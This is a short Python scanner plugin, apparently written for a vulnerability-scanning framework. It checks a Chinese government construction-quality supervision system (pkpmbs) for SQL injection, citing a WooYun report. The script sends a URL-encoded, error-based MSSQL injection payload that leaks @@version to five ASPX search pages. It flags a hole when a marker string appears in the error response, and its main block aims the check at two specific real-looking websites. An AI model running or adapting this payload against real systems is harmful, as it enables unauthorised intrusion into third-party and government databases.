#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:政府建设工程质量监督系统26处SQL注入打包
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0121058

def assign(service,arg):
    if service=="pkpmbs":
        return True,arg 
    


def  audit(arg):
    ps=[
        "pkpmbs/jdmanage/TJdZjyuanList.aspx",
        "pkpmbs/portal/InfocontentList.aspx",
        "pkpmbs/portal/InfoContentTreeList.aspx",
        "pkpmbs/portal/YzgcList.aspx",
        "pkpmbs/consmodel/TBpAreaList.aspx"
        ]
    for p in ps:
        post="keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit3=%E6%90%9C%E3%80%80%E7%B4%A2"
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url,post)
        if code==500 and  "GAOJIMicrosoft" in res:   
            security_hole(url)
        
if __name__=="__main__":
    from dummy import *
    audit(assign('pkpmbs','http://www.thszjz.com/')[1])
    audit(assign('pkpmbs','http://www.ccjdw.com/')[1])